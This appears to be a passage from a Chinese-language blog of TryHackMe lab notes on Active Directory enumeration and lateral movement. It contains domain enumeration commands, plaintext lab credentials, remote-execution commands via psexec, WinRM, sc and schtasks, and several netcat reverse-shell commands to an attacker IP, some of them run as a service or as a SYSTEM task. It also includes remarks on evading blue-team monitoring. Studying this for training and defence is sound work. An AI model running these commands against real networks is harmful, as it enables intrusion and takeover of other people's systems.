#ABB2BF"> timed out.</span></span><span class="line"><span style="color: #ABB2BF">    timeout was </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF"> seconds.</span></span><span class="line"><span style="color: #ABB2BF">服务器:  UnKnown</span></span><span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.200.68.101</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">名称:    thmjmp1.za.tryhackme.com</span></span><span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.200.68.248</span></span></code></pre></div></div></figure><h3 id="IP-和-域名"><a href="#IP-和-域名" class="headerlink" title="IP 和 域名"></a>IP 和 域名</h3><ul><li>当使用<strong>域名</strong>（hostname）访问时，<strong>首选</strong>的认证协议是 <strong>Kerberos</strong>。这是因为 Kerberos 的设计就是基于服务主体名称（Service Principal Name, SPN），它需要主机名才能正常工作。</li><li>当使用 <strong>IP 地址</strong>访问时，Kerberos 认证会<strong>失败</strong>，因为它无法为 IP 地址构建有效的 SPN。在这种情况下，Windows 会<strong>回退（fall back）</strong> 到 <strong>NTLM</strong> 认证。</li></ul><h2 id="Enumeration-枚举"><a href="#Enumeration-枚举" class="headerlink" title="Enumeration 枚举"></a>Enumeration 枚举</h2><p>这一块就介绍了几种方式去收集 AD 中相关信息的方法。</p><h3 id="MMC"><a href="#MMC" class="headerlink" title="MMC"></a>MMC</h3><p>即 Microsoft Management Console，如果是远程管理的话，要装一个 RAST 的组件。</p><p>如果是本地访问远端的域，不能直接在 runas 好的 cmd 中运行，要重新开始。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 本地运行</span></span><span class="line"><span style="color: #ABB2BF">runas.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\rachael.atkinson mmc</span></span></code></pre></div></div></figure><p>然后添加管理单元，把三个 AD 域的都勾上，再返回到主页右键加好的那些单元，都把域名指定好。</p><p><strong>优点</strong></p><ul><li><strong>全面的视图</strong>：图形用户界面提供了一个极好的方法来全面了解活动目录（AD）环境。</li><li><strong>快速搜索</strong>：可以对不同的活动目录对象进行快速搜索。</li><li><strong>直接查看更新</strong>：它提供了一种直接的方法来查看特定活动目录对象的更新。</li><li><strong>直接修改</strong>：如果我们有足够的权限，可以直接更新现有的活动目录对象或添加新的对象。</li></ul><p><strong>缺点</strong></p><ul><li><strong>需要远程桌面访问</strong>：图形用户界面需要在执行它的机器上进行远程桌面协议（RDP）访问。</li><li><strong>无法广域收集</strong>：虽然搜索单个对象很快，但无法进行全活动目录范围的属性或特征收集。</li></ul><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>注意⚠️：这个不能用 runas 来远程操作</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 显示域中所有用户</span></span><span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">user</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看某个用户的信息</span></span><span class="line"><span style="color: #ABB2BF">net user zoe.</span><span style="color: #E06C75">marshall</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看域中所有的组</span></span><span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">group</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看组中的成员</span></span><span class="line"><span style="color: #ABB2BF">net group </span><span style="color: #98C379">&quot;Tier 1 Admins&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看密码策略</span></span><span class="line"><span style="color: #ABB2BF">net </span><span style="color: #E06C75">accounts</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span></span></code></pre></div></div></figure><p>密码策略可以帮助我们更好地猜测在攻击中应该使用哪些单个密码，密码错误多少次锁定账户，又或者是锁定账户的时间。</p><p><strong>优点</strong></p><ul><li><strong>无需额外工具</strong>：不需要安装任何额外的或外部工具，并且这些简单的命令通常不会被蓝队（Blue team，指安全防御团队）监控到。</li><li><strong>无需图形界面</strong>：我们不需要图形用户界面（GUI）就可以进行这种枚举。</li><li><strong>支持宏语言</strong>：VBScript 和其他常用于钓鱼攻击（phishing payloads）的宏语言原生支持这些命令，因此可以在制作更具体的恶意负载之前，用来枚举关于活动目录（AD）域的初始信息。</li></ul><p><strong>缺点</strong></p><ul><li><strong>需要加入域</strong>：<code>net</code> 命令必须在已加入域（domain-joined）的机器上执行。如果机器没有加入域，它将默认显示 WORKGROUP（工作组）域的信息。</li><li><strong>信息不完整</strong>：<code>net</code> 命令可能无法显示所有信息。例如，如果一个用户是超过十个群组的成员，输出结果中将不会显示所有这些群组。</li></ul><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell 是 cmd 的升级版，最大的区别是提供了 cmdlets（类似方法调用），关于 AD 的 cmdlets 可以参考这个：<a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps</a></p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取用户的所有属性</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># -Properties * 是展示出所有的属性，另外可以手动指定</span></span><span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity gordon.stevens </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties </span><span style="color: #56B6C2">*</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 可以通过这种方法去过滤出需要的用户和要的信息</span></span><span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;Name -like &quot;*stevens&quot;&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> | </span><span style="color: #56B6C2">Format-Table</span><span style="color: #ABB2BF"> Name,SamAccountName </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">A</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看所有 AD 组</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Administrators 组信息</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity Administrators </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 AD 组成员</span></span><span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity Administrators </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 AD 对象</span></span><span class="line"><span style="color: #E06C75">$ChangeDate</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> DateTime(</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">02</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">Get-ADObject</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;whenChanged -gt $ChangeDate&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">includeDeletedObjects </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 找到错误密码次数大于 0 的用户</span></span><span class="line"><span style="color: #56B6C2">Get-ADObject</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Filter </span><span style="color: #98C379">&#39;badPwdCount -gt 0&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 获取 AD 域的信息</span></span><span class="line"><span style="color: #56B6C2">Get-ADDomain</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 给域内用户改密码</span></span><span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity gordon.stevens </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">OldPassword (</span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlaintext </span><span style="color: #98C379">&quot;old&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">force) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword (</span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #98C379">&quot;new&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force)</span></span></code></pre></div></div></figure><p><strong>优点</strong></p><ul><li><strong>信息量更大</strong>：PowerShell 的 cmdlet（命令行工具）可以比命令提示符中的 <code>net</code> 命令枚举出多得多的信息。</li><li><strong>支持远程执行</strong>：即使在未加入域的机器上，我们也可以通过 <code>runas</code> 命令来指定服务器和域，从而执行这些命令。</li><li><strong>自定义 cmdlet</strong>：我们可以创建自己的 cmdlet 来枚举特定的信息。</li><li><strong>直接修改对象</strong>：我们可以使用 AD-RSAT cmdlet 直接修改 AD 对象，例如重置密码或将用户添加到特定组。</li></ul><p><strong>缺点</strong></p><ul><li><strong>更容易被监控</strong>：与命令提示符相比，PowerShell 通常受到蓝队（安全防御团队）更多的监控。</li><li><strong>需要安装工具</strong>：我们必须安装 AD-RSAT 工具，或者使用其他可能更容易被检测到的脚本来进行 PowerShell 枚举。</li></ul><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>一种图形化分析工具，能图形化的分析域内的信息。然后要用到一个 Sharphound 工具，他是用来收集信息的。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">Sharphound.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">CollectionMethods</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">All</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">Domain</span><span style="color: #ABB2BF"> za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">ExcludeDCs</span></span></code></pre></div></div></figure><ul><li>CollectionMethods：第一次运行之后， 如果只要收集 Session，只运行 Session 即可。也就是提取用户当前登录机器的会话</li><li>Domain：指定要收集的域</li><li>ExcludeDcs：让工具不要去操作 DC，容易引起警报</li></ul><p>Bloodhound 依赖 neo4j 数据库，初次使用要部署一下，然后就是软件的基本使用了。这里用的是 v4 版本，说实话不好用，而且文档也不见了，新版的 Bloodhound 又分为社区版和商业版，之后再去研究，<del>感觉用不上</del>（我错了）。</p><p><strong>优点</strong></p><ul><li><strong>提供图形化界面</strong>：为活动目录（AD）枚举提供了图形用户界面。</li><li><strong>展示攻击路径</strong>：能够展示已枚举的活动目录信息中的潜在攻击路径。</li><li><strong>更深入的洞察</strong>：提供了对活动目录对象更深入的洞察，这些信息通常需要通过多次手动查询才能获取。</li></ul><p><strong>缺点</strong></p><ul><li><strong>需要执行 Sharphound</strong>：它的使用需要执行 Sharphound，这个过程会产生较多噪音，并且常常会被防病毒（AV）或端点检测与响应（EDR）解决方案检测到。</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>枚举 AD 是一项庞大的工作。为了更好地理解域的内部结构，并找出可以利用来进行特权提升或横向移动的攻击路径，进行全面的 AD 枚举是必不可少的。</p><h3 id="其他的枚举技术"><a href="#其他的枚举技术" class="headerlink" title="其他的枚举技术"></a>其他的枚举技术</h3><ul><li>LDAP 枚举</li><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li></ul><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><ul><li>监控事件<ul><li>AD 枚举技术会产生一堆 logon 事件，都是从一个 AD 用户发起的，能编写一个检测规则去识别这种攻击</li></ul></li><li>检测特定软件的签名</li><li>监控 CMD 和 PowerShell</li></ul><hr><h1 id="Lateral-Movement-and-Pivoting"><a href="#Lateral-Movement-and-Pivoting" class="headerlink" title="Lateral Movement and Pivoting"></a>Lateral Movement and Pivoting</h1><p>房间：<a href="https://tryhackme.com/room/lateralmovementandpivoting">https://tryhackme.com/room/lateralmovementandpivoting</a></p><p>时间：20250803 14:00 - 20250804 15:00 </p><hr><p>这个房间是教横向移动的，也就是从系统里面提取高权限账户，达到拿下高权限机器的作用，主要用的是 Hash 提取，还有 Kerberos。</p><p>本地账户只能通过 RDP 去操作有 UAC 的行为，类似 RPC&#x2F;SMB&#x2F;WinRM 之类的操作渠道不行，但是域账户不受限制，还有默认的 Administrator 用户。</p><h2 id="远程执行进程"><a href="#远程执行进程" class="headerlink" title="远程执行进程"></a>远程执行进程</h2><p>下面的技术都有不同的方法去实现相同的目的，有一些可能更加适合某些场景。</p><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><ul><li><strong>Ports:</strong> 445&#x2F;TCP (SMB)</li><li><strong>Required Group Memberships:</strong> Administrators</li></ul><p>Psexec 是多年来远程执行命令的首选，他允许管理员用户在其可访问的 PC 上远程执行命令，他是许多系统工具之一。</p><p><strong>他的工作流如下</strong>：连接到 $Admin 共享文件夹上传可执行的服务（PSEXESVC.exe） -&gt; 创建然后执行服务（C:\Windows\psexesvc.exe） -&gt; 创建一个管道（\.\pipe\psexesvc\）</p><p>运行 psexec 我们只需要提供管理员的凭据和要运行的命令，如下。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">psexec64.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">MACHINE_IP</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">Mypass123</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> cmd.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 使用 impacket 的 psexec</span></span><span class="line"><span style="color: #ABB2BF"># https://feifei.</span><span style="color: #E06C75">tw</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">impacket</span><span style="color: #ABB2BF">/</span></span><span class="line"><span style="color: #ABB2BF">python3 psexec.py ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">/t1_leonard.summers:EZpass4ever@THMIIS.za.tryhackme.com</span></span></code></pre></div></div></figure><p>参考链接：<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><h3 id="使用-WinRM-创建远程进程"><a href="#使用-WinRM-创建远程进程" class="headerlink" title="使用 WinRM 创建远程进程"></a>使用 WinRM 创建远程进程</h3><ul><li><strong>Ports:</strong> 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)</li><li><strong>Required Group Memberships:</strong> Remote Management Users</li></ul><p>他是一个基于 Web 的协议，可以远程发送 Powershell 命令给 Windows 主机。大多数 Windows Server 会默认开启 WinRM。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 通过 CMD 连接到远端 PowerShell 会话</span></span><span class="line"><span style="color: #56B6C2">winrs.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">u:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">p:EZpass4ever </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">r:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> cmd</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 通过 PowerShell 连接到远端 PowerShell 会话</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 凭证需要处理一下</span></span><span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ZA.TRYHACKME.COM\t1_leonard.summers&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;EZpass4ever&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force; </span></span><span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 传递凭证连接到远端</span></span><span class="line"><span style="color: #56B6C2">Enter-PSSession</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computername </span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 直接在远端执行命令并且回显</span></span><span class="line"><span style="color: #56B6C2">Invoke-Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Computername </span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ScriptBlock {whoami}</span></span></code></pre></div></div></figure><h3 id="通过-sc-远程创建服务"><a href="#通过-sc-远程创建服务" class="headerlink" title="通过 sc 远程创建服务"></a>通过 sc 远程创建服务</h3><ul><li>Ports:<ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)</li><li>445&#x2F;TCP (RPC over SMB Named Pipes)</li><li>139&#x2F;TCP (RPC over SMB Named Pipes)</li></ul></li><li><strong>Required Group Memberships:</strong> Administrators</li></ul><p>Windows 服务也可以被用来执行任意命令，因为它们在启动时就会运行一个命令。虽然服务的可执行文件在技术上与常规应用程序不同，但如果我们配置一个 Windows 服务去运行任何应用程序，它仍然会执行它，然后在<strong>执行结束后失败</strong>。并不是没有执行成功，是因为服务没有收到预期的服务控制信号而报错。</p><h4 id="sc-的连接过程"><a href="#sc-的连接过程" class="headerlink" title="sc 的连接过程"></a>sc 的连接过程</h4><p>sc 会尝试通过 RPC 多种方式连接到 Service Control Manager (SVCCTL) </p><ol><li><strong>DCE&#x2F;RPC</strong> 协议连接。客户端会首先连接到 <strong>135</strong> 端口上的 **Endpoint Mapper (EPM)**。EPM 就像一个可用 <strong>RPC 端点</strong>的目录，客户端会向它查询 <strong>SVCCTL</strong> 服务的相关信息。随后，EPM 会回复连接 SVCCTL 服务的 <strong>IP 地址和端口号</strong>，这个端口号通常是 <strong>49152-65535</strong> 范围内的动态端口。</li><li>如果后续的那个 RPC 连接失败，sc 就会尝试通过 SMB 命名管道去请求 SVCCTL，445 端口或者 139（SMB over NetBIOS）。</li></ol><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 通过 sc 创建用户示例</span></span><span class="line"><span style="color: #ABB2BF"># 注意等号后面带空格是 sc 的特性</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> create THMservice </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;net user munra Pass123 /add&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> start THMservice</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 利用 nc 反弹一个 shell 示例</span></span><span class="line"><span style="color: #ABB2BF"># 首先凭据注入一下 让注入好凭据的 shell 弹到我们的攻击机上</span></span><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4443&quot;</span></span><span class="line"><span style="color: #ABB2BF"># 再在 Shell 里面通过 sc 给目标机器创建服务</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\THMIIS.za.tryhackme.com create THMserviceRe </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4444&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\THMIIS.za.tryhackme.com start THMserviceRe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 停止和删除服务</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> stop THMservice</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> delete THMservice</span></span></code></pre></div></div></figure><h3 id="通过-schtasks-远程创建计划任务"><a href="#通过-schtasks-远程创建计划任务" class="headerlink" title="通过 schtasks 远程创建计划任务"></a>通过 schtasks 远程创建计划任务</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># /</span><span style="color: #E06C75">sc</span><span style="color: #ABB2BF"> 是计划的类型 ONCE 是执行一次</span></span><span class="line"><span style="color: #ABB2BF"># 因为我们是手动执行他，所以时间不重要</span></span><span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> THMIIS.za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">RU</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;SYSTEM&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">create</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">tn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">tr</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4444&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">sc</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ONCE</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">sd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">01</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">1970</span><span style="color: 